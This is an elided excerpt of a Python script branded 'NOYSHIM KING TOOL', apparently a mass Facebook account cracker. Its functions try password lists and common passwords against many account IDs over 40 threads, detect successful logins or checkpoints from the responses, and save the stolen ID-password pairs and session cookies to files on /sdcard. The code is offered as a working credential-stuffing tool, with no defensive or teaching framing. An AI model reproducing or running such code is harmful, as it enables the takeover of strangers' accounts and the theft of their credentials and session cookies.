...
#SCRIPT GIFT BY NOYSHIM

#GITHUB : https://github.com/NOYSHIM3987
...
try:
        ...
        from concurrent.futures import ThreadPoolExecutor as NOYSHIM
...
print(f'\033[1;91m[\033[1;92m●\033[1;91m]\x1b[38;5;46m WELCOME TO NOYSHIM KING TOOL')
...
def menu():
    ...
    print(f"""\033[1;31m[\033[1;37m6\033[1;31m] \033[0;94mCONTACT WITH NOYSHIM""")

    print("""\033[1;31m[\033[1;37m0\033[1;31m] \033[0;91mEXIT""")

    print('\033[10;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')

    NOYSHIM = input('\033[1;31m[\033[1;37m?\033[1;31m] \033[1;32mCHOOSE\033[1;37m :\033[0;95m ')
    ...
    elif NOYSHIM in ['3','03']:

        _old_()

    elif NOYSHIM in ['4','04']:

        enc()

    elif NOYSHIM in ['5','05']:

        dump()

    elif NOYSHIM in ['6','06']:
...
#       line()
       ...
       with NOYSHIM(max_workers=40) as skber:
...
def rndm1(uid,passlist):
        ...
        sys.stdout.write(f'\r\r{B}[{G}NOYSHIM-M1{B}]{G}-{B}[{bo}%s{B}]{G}-{B}[{G}OK•%s{M1}/{G}CP•{G}%s{B}] '%(loop,len(oks),len(cps)));sys.stdout.flush()
        ...
        try:
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        print(f'\r\r{R}[{G}NOYSHIM-OK{R}]{G} '+uid+f' | '+pas+'\033[1;97m')

                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])

                                        print(f"\r\r{Y}[{G}COOKIE{Y}] {G2}●{X1} "+coki)

                                        open('/sdcard/NOYSHIM-RANDOM-M1-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
                                        ...
                                        if 'y' in pcp:
                                                ...
                                                print(f'\r\r{B}[{Y}NOYSHIM-CP{B}]{Y} '+uid+' | '+pas+'\033[1;97m')

                                                open('/sdcard/NOYSHIM-CP.txt','a').write(uid+'|'+pas+'\n')
...
def rndm2(uid,passlist):
        ...
        sys.stdout.write(f'\r\r{B}[{G}NOYSHIM-M2{B}]{G}-{B}[{bo}%s{B}]{G}-{B}[{G}OK•%s{M1}/{G}CP•{G}%s{B}] '%(loop,len(oks),len(cps)));sys.stdout.flush()
...
def rndm3(uid,passlist):
        ...
        sys.stdout.write(f'\r\r{B}[{G}NOYSHIM-M3{B}]{G}-{B}[{bo}%s{B}]{G}-{B}[{G}OK•%s{M1}/{G}CP•{G}%s{B}] '%(loop,len(oks),len(cps)));sys.stdout.flush()
    ...
    try:
        ...
        for pw in ["123456","1234567","12345678","123456789","123123","112233","1234567890"]:
            ...
            if "session_key" in rp:
                ...
                print(f"\r{R}[{R}NOYSHIM-OK{R}]{R} {uid} | {pw}")

                open("/sdcard/NOYSHIM-ok.txt","a").write(uid+"|"+pw+"\n")
            	...
            	print(f"\r{R}[{G1}NOYSHIM-OK{R}]{G1} {uid} | {pw}")

            	open("/sdcard/NOYSHIM-cp.txt","a").write(uid+"|"+pw+"\n")
            	...
            	print(f"\r{R}[{G1}NOYSHIM-2F{R}]{G1} {uid} | {pw}")

            	open("/sdcard/NOYSHIM-2f.txt","a").write(uid+"|"+pw+"\n")
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[1;31m[\033[1;37mNOYSHIM•M1\033[1;31m]{P}-\033[1;31m[{bo}{loop}\033[1;31m]-[{H}{len(id)}\033[1;31m]\033[1;37m-\033[1;31m[{H}OK•{H}{oki}\033[1;31m/{H}CP•{H}{cpi}\033[1;31m] [{P}{'{:.0%}'.format(loop/float(len(id)))}\033[1;31m]\033[0;37m "),
    ...
    for pw in pwv:
        ...
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                ...
                print(f'\r\x1b[1;96m[NOYSHIM-2F] \x1b[38;5;205m {idf} | {pw}')
                ...
                print(f'\r\x1b[1;96m[NOYSHIM-OK] \x1b[38;5;205m {idf} |\033[1;92m {pw}\n\x1b[1;91m[🍁] COOKIES • \033[0;93m{kuki} ')
...
def crackfree(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[1;31m[\033[1;37mNOYSHIM•M2\033[1;31m]{P}-\033[1;31m[{bo}{loop}\033[1;31m]-[{H}{len(id)}\033[1;31m]\033[1;37m-\033[1;31m[{H}OK•{H}{oki}\033[1;31m/{H}CP•{H}{cpi}\033[1;31m] [{P}{'{:.0%}'.format(loop/float(len(id)))}\033[1;31m]\033[0;37m "),
...
def cracktouch(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[1;31m[\033[1;37mNOYSHIM•M3\033[1;31m]{P}-\033[1;31m[{bo}{loop}\033[1;31m]-[{H}{len(id)}\033[1;31m]\033[1;37m-\033[1;31m[{H}OK•{H}{oki}\033[1;31m/{H}CP•{H}{cpi}\033[1;31m] [{P}{'{:.0%}'.format(loop/float(len(id)))}\033[1;31m]\033[0;37m "),
